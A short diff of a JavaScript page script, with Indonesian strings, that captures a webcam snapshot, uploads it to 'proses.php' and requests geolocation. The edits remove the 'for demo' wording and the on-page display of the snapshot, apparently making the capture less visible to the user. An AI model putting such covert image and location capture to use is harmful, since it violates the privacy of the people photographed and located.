@@ -16,7 +16,7 @@ function handleVideo(stream) {
 }
 
 function videoError(e) {
-    alert("Izinkan menggunakan webcam untuk demo!")
+    alert("Izinkan menggunakan webcam")
 }
 
 
@@ -31,7 +31,6 @@ function takeSnapshot() {
     context = canvas.getContext('2d');
     context.drawImage(video, 0, 0, width, height);
     img.src = canvas.toDataURL('image/jpeg');
-    //document.body.appendChild(img);
     var hr = new XMLHttpRequest();
     var imgData = img.src;
     hr.open("POST", "proses.php", true);
@@ -48,7 +47,7 @@ function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition);
     } else { 
-        x.innerHTML = "Geolocation is not supported by this browser.";
+       console.log("Geolocation is not supported by this browser.");
     }
 }
 
